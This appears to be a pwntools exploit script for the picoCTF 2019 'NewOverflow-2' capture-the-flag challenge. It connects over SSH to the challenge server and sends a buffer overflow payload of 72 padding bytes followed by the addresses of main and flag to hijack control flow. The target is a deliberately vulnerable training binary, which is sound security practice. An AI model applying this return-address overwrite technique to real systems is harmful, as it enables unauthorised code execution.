#!/usr/bin/env python

from pwn import *
from getpass import getpass
import sys

#load elf binary to var e and grab addys
e = ELF('./vuln')
flag = e.symbols['flag']
main = e.symbols['main']


#connect and load process
ssh = ssh(host='2019shell1.picoctf.com', user='ems3t', password=getpass())
p = ssh.process('vuln', cwd='/problems/newoverflow-2_4_2cbec72146545064c6623c465faba84e')


#build and send payload
payload = ''
payload+= 'A'*72
payload+= p64(main)
payload+= p64(flag)
p.sendlineafter('?\n', payload)
p.interactive()

